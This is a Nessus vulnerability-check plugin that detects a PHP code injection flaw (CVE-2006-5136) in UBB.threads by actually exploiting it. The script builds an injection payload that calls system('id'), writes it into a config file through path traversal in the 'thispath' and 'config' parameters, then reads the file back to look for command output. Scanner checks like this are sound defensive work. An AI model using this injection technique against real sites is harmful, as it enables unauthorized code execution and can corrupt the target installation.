#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that allows injection of
arbitrary PHP commands. 

Description :

The version of UBB.threads installed on the remote host fails to
sanitize input to the 'thispath' and 'config' parameters of the
'admin/doeditconfig.php' script before using them to update the
application's configuration file.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
this flaw to modify configuration settings for the affected
application and even injecting arbitary PHP code to be executed
whenever the config file is loaded. 

See also :

http://milw0rm.com/exploits/2457
http://www.nessus.org/u?5b90f99d
http://www.nessus.org/u?0666a806
http://www.nessus.org/u?324c0824

Solution :

Either disable PHP's 'register_globals' setting or upgrade to UBB.threads
6.5.5 or later.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22480);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-5136");
  script_bugtraq_id(20266);

  script_name(english:"UBB.threads doeditconfig Command Injection Vulnerability");
  script_summary(english:"Tries to exploit an command injection flaw in UBB.threads");

  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("ubbthreads_detect.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/no404/" + port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/ubbthreads"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to create an alternate config file.
  #
  # nb: if subdir is "/includes" as in the published PoC, we trash the install!!!
  subdir = "/";

  # nb: PHP code injection works if magic_quotes is disabled
  cmd = "id";
  exploit = string('";if ($_SERVER[REMOTE_ADDR] == "', this_host(), '") { system(', cmd, '); };"');

  req = http_get(
    item:string(
      dir, "/admin/doeditconfig.php?",
      "thispath=..", subdir, "&",
      "config[", SCRIPT_NAME, "]=", urlencode(str:exploit)
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # Now grab the freshly-minted config file.
  req = http_get(item:string(dir, subdir, "/config.inc.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

   # There's definitely a problem if we see command output.
  line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
  if (line)
  {
    if (report_verbosity)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able execute the command '", cmd, "' on the remote host;\n",
        "it produced the following output :\n",
        "\n",
        line
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }

  # Otherwise, there's a problem if it exists and we're being paranoid.
  if (report_paranoia > 1 && egrep(string:res, pattern:"^HTTP/.* 200 OK"))
  {
    security_warning(port);
    exit(0);
  }

}
